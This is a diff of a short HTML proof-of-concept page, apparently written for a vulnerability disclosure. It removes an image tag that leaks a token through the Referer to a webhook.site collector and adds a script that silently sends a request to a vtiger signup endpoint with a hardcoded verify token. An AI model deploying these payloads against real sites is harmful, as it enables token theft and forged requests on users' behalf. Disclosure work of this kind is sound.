@@ -1,9 +1,15 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>PoC: Token Leak via Referer</title>
-  </head>
   <body>
-    <img src="https://webhook.site/d8f4e5e6-1316-4705-aef3-6180216d686a/image.png" alt="." />
+    <script>
+      fetch("https://crmaccess.vtiger.com/vtigeraddons/odsignupv2/proxy.php?operation=signup&data%5Bverifytoken%5D=2e703c2e-bf51-4bb9-a055-b7ad42331e24", {
+        method: "GET",
+        mode: "no-cors"
+      }).then(response => {
+        console.log("Request sent");
+      }).catch(err => {
+        console.error(err);
+      });
+    </script>
   </body>
 </html>
